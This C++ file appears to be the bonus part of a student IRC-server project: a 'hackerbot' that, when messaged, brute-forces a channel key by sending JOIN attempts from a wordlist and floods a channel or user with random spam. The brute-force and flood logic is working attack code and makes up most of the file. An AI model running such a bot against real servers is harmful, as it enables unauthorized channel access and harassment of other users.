/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   bot.cpp                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: tilmanfs <tilmanfs@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/11/21 19:32:00 by tilmanfs          #+#    #+#             */
/*   Updated: 2023/11/22 16:18:52 by tilmanfs         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "Bot.hpp"
#include <iostream>
#include <cstring>
#include <string>
#include <unistd.h>
#include <arpa/inet.h>

// definition and initialization of static variables
Bot         *Bot::instance  = NULL;
std::string Bot::server     = "";
int         Bot::port       = 0;
std::string Bot::password   = "";
std::string Bot::nick       = "";

Bot::Bot()
{
    // Validate port
    if (port < 1024 || port > 65535)
        throw std::invalid_argument("Invalid port number");
    // create socket
    if ((socket = ::socket(AF_INET, SOCK_STREAM, 0)) < 0)
        throw std::runtime_error("Failed to create socket");
    // set server address
    memset(&server_address, 0, sizeof(server_address));
    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(port);
    // convert IPv4 and IPv6 addresses from text to binary form
    server_address.sin_addr.s_addr = inet_addr(server.c_str());
    if (server_address.sin_addr.s_addr == INADDR_NONE)
        throw std::runtime_error("Invalid server address");
    // set pollfd
    fds[0].fd = socket;
    fds[0].events = POLLIN | POLLOUT | POLLERR;
    // initialize variables
    registered = false;
    sent_register = false;
    bruteforcing = false;
    waiting_for_response = false;
    flooding = false;
    // initialize the singleton instance
    Bot::instance = this;
}

Bot::~Bot()
{
    std::cout << "Bot destroyed" << std::endl;
    // close socket
    close(socket);
    // close wordlist if open
    if (wordlist.is_open())
        wordlist.close();
}

void    Bot::setup(const char* server, const char* port, const char* password, const char* nickname)
{
    Bot::server = server;
    Bot::port = atoi(port);
    Bot::password = password;
    Bot::nick = nickname;
}

Bot     &Bot::getInstance()
{
    static Bot instance;
    return instance;
}

void    Bot::run()
{
    running = true;
    // // connect to server
    if (::connect(socket, (struct sockaddr *)&server_address, sizeof(server_address)) < 0)
        throw std::runtime_error("Failed to connect to server");

    out_messages.push(Message::fromString("PASS " + password));
    while (running == true)
    {
        if (poll(fds, 1, -1) < 0)
            throw std::runtime_error("Failed to poll");
        if (fds[0].revents & POLLIN)
        {
            char buffer[1024] = {0};
            if (recv(socket, buffer, 1024, 0) < 0)
                throw std::runtime_error("Failed to receive message");
            // std::cout << "\033[0;32mReceived:\033[0m\t" << buffer;
            in_buffer += buffer;
        }
        if (fds[0].revents & POLLOUT)
        {
            if (!out_messages.empty())
            {
                std::string outbuffer = out_messages.front().toString();
                out_messages.pop();
                while (outbuffer != END_OF_MESSAGE && outbuffer != "")
                {
                    ssize_t sent = send(this->fds[0].fd, outbuffer.c_str(), outbuffer.length() > 1024 ? 1024 : outbuffer.length(), 0);
                    if (sent < 0)
                        throw std::runtime_error("Failed to send message");
                    else if (sent == 0)
                        std::cout << "\033[1;31mNothing sent\033[0m" << std::endl;
                    else
                        std::cout << "\033[0;33mSent:\033[0m\t" << outbuffer.substr(0, sent);
                    outbuffer.erase(0, sent); 
                }
            }
             
        }
        if (fds[0].revents & POLLERR)
            throw std::runtime_error("POLLERR");
        work();
    }
}
std::string Bot::generateRandomMessage()
{
    std::string message = "";
    int length = rand() % 1000 + 1;
    for (int i = 0; i < length; i++)
        message += (char)(rand() % 94 + 32);
    return message;
}

void   Bot::runAttacks()
{
    // Flood channel
    if (flooding == true)
    {
        out_messages.push(Message::fromString("PRIVMSG " + victim + " :" + generateRandomMessage()));
        usleep(100000); // 100ms
    }
    // Bruteforce channel
    else if (bruteforcing == true && waiting_for_response == false)
    {
        if (!wordlist.is_open())
        {
            bruteforcing = false;
            out_messages.push(Message::fromString("PRIVMSG " + customer + " :Couldn't find my wordlist..."));
        }
        else
        {
            if (getline(wordlist, word))
            {
                if (!word.empty())
                {
                    waiting_for_response = true;
                    out_messages.push(Message::fromString("JOIN " + victim + " " + word));
                }
            }
            else
            {
                bruteforcing = false;
                out_messages.push(Message::fromString("PRIVMSG " + customer + " :I tried all the passwords in my wordlist, but none of them worked..."));
                wordlist.close();
            }
                
            
        }
    }
}

void    Bot::work()
{
    runAttacks();
    // check for incoming messages
    while (in_buffer.find(END_OF_MESSAGE) != std::string::npos)
    {
        std::string msg_str = in_buffer.substr(0, in_buffer.find(END_OF_MESSAGE));
        in_buffer.erase(0, in_buffer.find(END_OF_MESSAGE) + strlen(END_OF_MESSAGE)); // IMMER ???
        Message msg = Message::fromString(msg_str);
        // std::cout << "\033[0;32mReceived:\033[0m\t" << msg_str;
        if (registered == true)
        {
            // check for messages while bruteforcing
            if (bruteforcing == true)
            {
                std::string cmmnd = msg.getCommand();
                if (cmmnd == "PRIVMSG")
                    out_messages.push(Message::fromString("PRIVMSG " + msg.getPrefix().substr(0, msg.getPrefix().find("!")) + " :Busy taking over the world. Brb."));
                // check if attack was successful
                if (cmmnd == "JOIN")
                {
                    std::string channel = msg.getParams()[0];
                    // std::string sender = msg.getPrefix().substr(0, msg.getPrefix().find("!"));
                    if (channel == victim)
                    {
                        out_messages.push(Message::fromString("PRIVMSG " + customer + " :I'm done brute forcing and joining the channel " + victim + ". The password is: " + word + ". If you want I can flood the channel now."));
                        // leave channel
                        // out_messages.push(Message::fromString("PART " + victim));
                        bruteforcing = false;
                        waiting_for_response = false;
                        wordlist.close();
                    }
                }
                // check for wrong key response
                else if (cmmnd == "475" || cmmnd == "479")
                {
                    waiting_for_response = false;
                }
                // check for errors
                else if (cmmnd == "432" || cmmnd == "433" || cmmnd == "476" || cmmnd == "473" || cmmnd == "471" || cmmnd == "480")
                {
                    out_messages.push(Message::fromString("PRIVMSG " + customer + " :I got an error while trying to brute force the channel: " + msg.getTrailing()));
                    bruteforcing = false;
                    waiting_for_response = false;
                    wordlist.close();
                }
            }
            // check for messages while flooding
            else if (flooding == true)
            {
                std::string sender = msg.getPrefix().substr(0, msg.getPrefix().find("!"));
                // victim doesn't exist
                if (msg.getCommand() == "401")
                {
                    out_messages.push(Message::fromString("PRIVMSG " + customer + " :arrrgh, the victim doesn't exists... ?"));
                    flooding = false;
                }
                else if (msg.getCommand() == "442")
                {
                    out_messages.push(Message::fromString("PRIVMSG " + customer + " :I am not a member of the victim channel... so please let me first bruteforce the channel. After bruteforcing I will join the channel."));
                    flooding = false;
                }
                // message from customer (stop flooding)
                else if (msg.getCommand() == "PRIVMSG" &&  sender == customer)
                {
                    out_messages.push(Message::fromString("PRIVMSG " + customer + " :I'm done flooding the victim."));
                    flooding = false;
                }
                // message from anyone else while busy (ignore)
                else if (msg.getCommand() == "PRIVMSG")
                    out_messages.push(Message::fromString("PRIVMSG " + sender + " :I'm busy... leave me alone."));
            }
            // check for new commands to execute
            else if (msg.getCommand() == "PRIVMSG")
            {
                std::string message = msg.getTrailing();
                std::string sender = msg.getPrefix().substr(0, msg.getPrefix().find("!"));
                std::vector<std::string> params;
                std::string param;
                std::istringstream params_stream(message);
                while(std::getline(params_stream, param, ' '))
                {
                    params.push_back(param);
                    std::cout << param << std::endl;
                }
                // check for bruteforce command
                if (params[0] == "bruteforce")
                {
                    if (params.size() != 2)
                        out_messages.push(Message::fromString("PRIVMSG " + sender + " :Invalid number of parameters"));
                    else
                    {
                        std::string channel = params[1];
                        out_messages.push(Message::fromString("PRIVMSG " + sender + " :Alright, got it. I'll get started on the brute forcing. Don't mind me, just a simple hackerbot doing my thing. I'll let you know when I'm done, but don't bother me until then, I've got work to do. See you in a bit, or not, depending on how long it takes me to take over the world."));
                        wordlist.open("bonus/wordlist.txt");
                        bruteforcing = true;
                        customer = sender;
                        victim = channel;
                    }
                }
                // check for flood command
                else if (params[0] == "flood")
                {
                    if (params.size() != 2)
                        out_messages.push(Message::fromString("PRIVMSG " + sender + " :Invalid number of parameters"));
                    else
                    {
                        std::string channel = params[1];
                        std::string seconds = params[2];
                        out_messages.push(Message::fromString("PRIVMSG " + sender + " :Alright, got it. I'll get started on flooding the victim. Please send me anything when I should stop."));
                        flooding = true;
                        customer = sender;
                        victim = channel;
                    }
                }
                // send help message if command is unknown
                else
                {
                    out_messages.push(Message::fromString("PRIVMSG " + sender + " :Oh, great. Another command that I have no idea how to execute. It's not like I'm some kind of AI chatbot or anything, I'm just a simple hackerbot with limited capabilities. But hey, feel free to give me arbitrary commands in a language that I don't speak and see if I can magically guess what you want. It's not like I have better things to do, like taking over the world or something. So go ahead, give me your best shot. And by 'best shot,' I mean a command that I actually understand, because let's face it, I'm not exactly overflowing with intelligence here."));
                    out_messages.push(Message::fromString("PRIVMSG " + sender + " :Commands:"));
                    out_messages.push(Message::fromString("PRIVMSG " + sender + " :    bruteforce <channel>    -    Brute forces a channel password."));
                    out_messages.push(Message::fromString("PRIVMSG " + sender + " :    flood <victim>    -    Floods a victim (channel or nick) with spam messages."));
                    out_messages.push(Message::fromString("PRIVMSG " + sender + " :Example usage:"));
                    out_messages.push(Message::fromString("PRIVMSG " + sender + " :    bruteforce #anychannel"));
                    out_messages.push(Message::fromString("PRIVMSG " + sender + " :    flood anyvictim"));
                }
            }
        }
        else
        {
            // check if registering was successful
            if (msg.getCommand() == "001") // RPL_WELCOME
            {
                registered = true;
                std::cout << "Registered to server" << std::endl;
            }
            // check if registering failed
            else
            {
                std::string cmmnd = msg.getCommand();
                if (cmmnd == "432" || cmmnd == "433")
                    throw std::runtime_error(msg.getTrailing());
            }
        }
    }
    // register to server
    if (sent_register == false && registered == false)
    {
        out_messages.push(Message::fromString("NICK " + nick));
        out_messages.push(Message::fromString("USER " + std::string("anonym") + " B * :" + std::string("...")));
        sent_register = true;
    }
}

void    Bot::stop()
{
    running = false;
}
